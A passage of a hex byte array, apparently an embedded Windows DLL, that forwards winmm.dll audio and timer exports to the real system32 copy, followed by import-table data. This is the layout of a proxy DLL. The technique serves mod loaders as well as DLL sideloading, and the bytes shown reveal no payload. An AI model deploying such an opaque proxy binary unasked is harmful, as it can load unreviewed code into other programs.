	0x65, 0x76, 0x43, 0x61, 0x70, 0x73, 0x57, 0x00, 0x6D, 0x69, 0x78, 0x65, 0x72, 0x47, 0x65, 0x74,
	0x4C, 0x69, 0x6E, 0x65, 0x43, 0x6F, 0x6E, 0x74, 0x72, 0x6F, 0x6C, 0x73, 0x57, 0x00, 0x5C, 0x5C,
	0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73,
	0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32,
	0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x6D, 0x69, 0x78, 0x65, 0x72, 0x47, 0x65, 0x74, 0x4C,
	0x69, 0x6E, 0x65, 0x43, 0x6F, 0x6E, 0x74, 0x72, 0x6F, 0x6C, 0x73, 0x57, 0x00, 0x6D, 0x69, 0x78,
	0x65, 0x72, 0x47, 0x65, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x49, 0x6E, 0x66, 0x6F, 0x57, 0x00, 0x5C,
	0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79,
	0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33,
	0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x6D, 0x69, 0x78, 0x65, 0x72, 0x47, 0x65, 0x74,
	0x4C, 0x69, 0x6E, 0x65, 0x49, 0x6E, 0x66, 0x6F, 0x57, 0x00, 0x6D, 0x69, 0x78, 0x65, 0x72, 0x47,
	0x65, 0x74, 0x4E, 0x75, 0x6D, 0x44, 0x65, 0x76, 0x73, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C,
	0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72,
	0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E,
	0x6D, 0x6D, 0x2E, 0x6D, 0x69, 0x78, 0x65, 0x72, 0x47, 0x65, 0x74, 0x4E, 0x75, 0x6D, 0x44, 0x65,
	0x76, 0x73, 0x00, 0x6D, 0x69, 0x78, 0x65, 0x72, 0x53, 0x65, 0x74, 0x43, 0x6F, 0x6E, 0x74, 0x72,
	0x6F, 0x6C, 0x44, 0x65, 0x74, 0x61, 0x69, 0x6C, 0x73, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C,
	0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72,
	0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E,
	0x6D, 0x6D, 0x2E, 0x6D, 0x69, 0x78, 0x65, 0x72, 0x53, 0x65, 0x74, 0x43, 0x6F, 0x6E, 0x74, 0x72,
	0x6F, 0x6C, 0x44, 0x65, 0x74, 0x61, 0x69, 0x6C, 0x73, 0x00, 0x74, 0x69, 0x6D, 0x65, 0x42, 0x65,
	0x67, 0x69, 0x6E, 0x50, 0x65, 0x72, 0x69, 0x6F, 0x64, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C,
	0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72,
	0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E,
	0x6D, 0x6D, 0x2E, 0x74, 0x69, 0x6D, 0x65, 0x42, 0x65, 0x67, 0x69, 0x6E, 0x50, 0x65, 0x72, 0x69,
	0x6F, 0x64, 0x00, 0x74, 0x69, 0x6D, 0x65, 0x45, 0x6E, 0x64, 0x50, 0x65, 0x72, 0x69, 0x6F, 0x64,
	0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C,
	0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65,
	0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x74, 0x69, 0x6D, 0x65, 0x45, 0x6E,
	0x64, 0x50, 0x65, 0x72, 0x69, 0x6F, 0x64, 0x00, 0x74, 0x69, 0x6D, 0x65, 0x47, 0x65, 0x74, 0x44,
	0x65, 0x76, 0x43, 0x61, 0x70, 0x73, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61,
	0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74,
	0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E,
	0x74, 0x69, 0x6D, 0x65, 0x47, 0x65, 0x74, 0x44, 0x65, 0x76, 0x43, 0x61, 0x70, 0x73, 0x00, 0x74,
	0x69, 0x6D, 0x65, 0x47, 0x65, 0x74, 0x54, 0x69, 0x6D, 0x65, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67,
	0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D,
	0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69,
	0x6E, 0x6D, 0x6D, 0x2E, 0x74, 0x69, 0x6D, 0x65, 0x47, 0x65, 0x74, 0x54, 0x69, 0x6D, 0x65, 0x00,
	0x74, 0x69, 0x6D, 0x65, 0x4B, 0x69, 0x6C, 0x6C, 0x45, 0x76, 0x65, 0x6E, 0x74, 0x00, 0x5C, 0x5C,
	0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73,
	0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32,
	0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x74, 0x69, 0x6D, 0x65, 0x4B, 0x69, 0x6C, 0x6C, 0x45,
	0x76, 0x65, 0x6E, 0x74, 0x00, 0x74, 0x69, 0x6D, 0x65, 0x53, 0x65, 0x74, 0x45, 0x76, 0x65, 0x6E,
	0x74, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74,
	0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74,
	0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x74, 0x69, 0x6D, 0x65, 0x53,
	0x65, 0x74, 0x45, 0x76, 0x65, 0x6E, 0x74, 0x00, 0x77, 0x61, 0x76, 0x65, 0x49, 0x6E, 0x4D, 0x65,
	0x73, 0x73, 0x61, 0x67, 0x65, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C,
	0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C,
	0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x77,
	0x61, 0x76, 0x65, 0x49, 0x6E, 0x4D, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x00, 0x77, 0x61, 0x76,
	0x65, 0x4F, 0x75, 0x74, 0x43, 0x6C, 0x6F, 0x73, 0x65, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C,
	0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72,
	0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E,
	0x6D, 0x6D, 0x2E, 0x77, 0x61, 0x76, 0x65, 0x4F, 0x75, 0x74, 0x43, 0x6C, 0x6F, 0x73, 0x65, 0x00,
	0x77, 0x61, 0x76, 0x65, 0x4F, 0x75, 0x74, 0x47, 0x65, 0x74, 0x44, 0x65, 0x76, 0x43, 0x61, 0x70,
	0x73, 0x57, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F,
	0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73,
	0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x77, 0x61, 0x76, 0x65,
	0x4F, 0x75, 0x74, 0x47, 0x65, 0x74, 0x44, 0x65, 0x76, 0x43, 0x61, 0x70, 0x73, 0x57, 0x00, 0x77,
	0x61, 0x76, 0x65, 0x4F, 0x75, 0x74, 0x47, 0x65, 0x74, 0x45, 0x72, 0x72, 0x6F, 0x72, 0x54, 0x65,
	0x78, 0x74, 0x57, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F,
	0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79,
	0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x77, 0x61, 0x76,
	0x65, 0x4F, 0x75, 0x74, 0x47, 0x65, 0x74, 0x45, 0x72, 0x72, 0x6F, 0x72, 0x54, 0x65, 0x78, 0x74,
	0x57, 0x00, 0x77, 0x61, 0x76, 0x65, 0x4F, 0x75, 0x74, 0x47, 0x65, 0x74, 0x4E, 0x75, 0x6D, 0x44,
	0x65, 0x76, 0x73, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F,
	0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79,
	0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x77, 0x61, 0x76,
	0x65, 0x4F, 0x75, 0x74, 0x47, 0x65, 0x74, 0x4E, 0x75, 0x6D, 0x44, 0x65, 0x76, 0x73, 0x00, 0x77,
	0x61, 0x76, 0x65, 0x4F, 0x75, 0x74, 0x47, 0x65, 0x74, 0x50, 0x6F, 0x73, 0x69, 0x74, 0x69, 0x6F,
	0x6E, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74,
	0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74,
	0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x77, 0x61, 0x76, 0x65, 0x4F,
	0x75, 0x74, 0x47, 0x65, 0x74, 0x50, 0x6F, 0x73, 0x69, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x77, 0x61,
	0x76, 0x65, 0x4F, 0x75, 0x74, 0x47, 0x65, 0x74, 0x56, 0x6F, 0x6C, 0x75, 0x6D, 0x65, 0x00, 0x5C,
	0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79,
	0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33,
	0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x77, 0x61, 0x76, 0x65, 0x4F, 0x75, 0x74, 0x47,
	0x65, 0x74, 0x56, 0x6F, 0x6C, 0x75, 0x6D, 0x65, 0x00, 0x77, 0x61, 0x76, 0x65, 0x4F, 0x75, 0x74,
	0x4D, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62,
	0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F,
	0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D,
	0x2E, 0x77, 0x61, 0x76, 0x65, 0x4F, 0x75, 0x74, 0x4D, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x00,
	0x77, 0x61, 0x76, 0x65, 0x4F, 0x75, 0x74, 0x4F, 0x70, 0x65, 0x6E, 0x00, 0x5C, 0x5C, 0x3F, 0x5C,
	0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65,
	0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77,
	0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x77, 0x61, 0x76, 0x65, 0x4F, 0x75, 0x74, 0x4F, 0x70, 0x65, 0x6E,
	0x00, 0x77, 0x61, 0x76, 0x65, 0x4F, 0x75, 0x74, 0x50, 0x61, 0x75, 0x73, 0x65, 0x00, 0x5C, 0x5C,
	0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73,
	0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32,
	0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x77, 0x61, 0x76, 0x65, 0x4F, 0x75, 0x74, 0x50, 0x61,
	0x75, 0x73, 0x65, 0x00, 0x77, 0x61, 0x76, 0x65, 0x4F, 0x75, 0x74, 0x50, 0x72, 0x65, 0x70, 0x61,
	0x72, 0x65, 0x48, 0x65, 0x61, 0x64, 0x65, 0x72, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F,
	0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F,
	0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D,
	0x6D, 0x2E, 0x77, 0x61, 0x76, 0x65, 0x4F, 0x75, 0x74, 0x50, 0x72, 0x65, 0x70, 0x61, 0x72, 0x65,
	0x48, 0x65, 0x61, 0x64, 0x65, 0x72, 0x00, 0x77, 0x61, 0x76, 0x65, 0x4F, 0x75, 0x74, 0x52, 0x65,
	0x73, 0x65, 0x74, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F,
	0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79,
	0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x77, 0x61, 0x76,
	0x65, 0x4F, 0x75, 0x74, 0x52, 0x65, 0x73, 0x65, 0x74, 0x00, 0x77, 0x61, 0x76, 0x65, 0x4F, 0x75,
	0x74, 0x52, 0x65, 0x73, 0x74, 0x61, 0x72, 0x74, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F,
	0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F,
	0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D,
	0x6D, 0x2E, 0x77, 0x61, 0x76, 0x65, 0x4F, 0x75, 0x74, 0x52, 0x65, 0x73, 0x74, 0x61, 0x72, 0x74,
	0x00, 0x77, 0x61, 0x76, 0x65, 0x4F, 0x75, 0x74, 0x53, 0x65, 0x74, 0x56, 0x6F, 0x6C, 0x75, 0x6D,
	0x65, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74,
	0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74,
	0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x77, 0x61, 0x76, 0x65, 0x4F,
	0x75, 0x74, 0x53, 0x65, 0x74, 0x56, 0x6F, 0x6C, 0x75, 0x6D, 0x65, 0x00, 0x77, 0x61, 0x76, 0x65,
	0x4F, 0x75, 0x74, 0x55, 0x6E, 0x70, 0x72, 0x65, 0x70, 0x61, 0x72, 0x65, 0x48, 0x65, 0x61, 0x64,
	0x65, 0x72, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F,
	0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73,
	0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x77, 0x61, 0x76, 0x65,
	0x4F, 0x75, 0x74, 0x55, 0x6E, 0x70, 0x72, 0x65, 0x70, 0x61, 0x72, 0x65, 0x48, 0x65, 0x61, 0x64,
	0x65, 0x72, 0x00, 0x77, 0x61, 0x76, 0x65, 0x4F, 0x75, 0x74, 0x57, 0x72, 0x69, 0x74, 0x65, 0x00,
	0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73,
	0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D,
	0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x77, 0x61, 0x76, 0x65, 0x4F, 0x75, 0x74,
	0x57, 0x72, 0x69, 0x74, 0x65, 0x00, 0x00, 0x00, 0xE0, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x9A, 0x76, 0x00, 0x00, 0x18, 0x41, 0x00, 0x00, 0xF0, 0x73, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x90, 0x78, 0x00, 0x00, 0x28, 0x40, 0x00, 0x00,
	0xF0, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xDE, 0x79, 0x00, 0x00,
	0x28, 0x41, 0x00, 0x00, 0xC8, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x42, 0x7A, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x68, 0x76, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x88, 0x7A, 0x00, 0x00, 0xA0, 0x42, 0x00, 0x00, 0xC0, 0x74, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x92, 0x7A, 0x00, 0x00, 0xF8, 0x40, 0x00, 0x00,
	0x88, 0x75, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFA, 0x7C, 0x00, 0x00,
	0xC0, 0x41, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x18, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2C, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xEA, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x3C, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x52, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x64, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x72, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x82, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x92, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xAE, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBC, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xCC, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x18, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xFE, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x14, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x26, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x34, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x4A, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x52, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x6E, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7C, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xA6, 0x76, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB8, 0x76, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xCC, 0x76, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xDE, 0x76, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x2E, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF4, 0x76, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xEC, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80,
	0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x88, 0x76, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x3C, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x52, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x60, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x7E, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x94, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xAA, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBE, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xCE, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1E, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x08, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF4, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xD8, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xCC, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xBA, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAC, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x9E, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x30, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xDC, 0x7C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xBA, 0x7C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA4, 0x7C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xA0, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB6, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xCA, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xDC, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xF2, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x7B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x1E, 0x7B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3A, 0x7B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x58, 0x7B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x68, 0x7B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x80, 0x7B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x9A, 0x7B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xAE, 0x7B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC6, 0x7B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xD0, 0x7B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xEA, 0x7B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xF8, 0x7B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x14, 0x7C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x26, 0x7C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x34, 0x7C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x42, 0x7C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x5A, 0x7C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x74, 0x7C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x94, 0x7C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x62, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x50, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x76, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAF, 0x01, 0x53, 0x68, 0x65, 0x6C, 0x6C, 0x45,
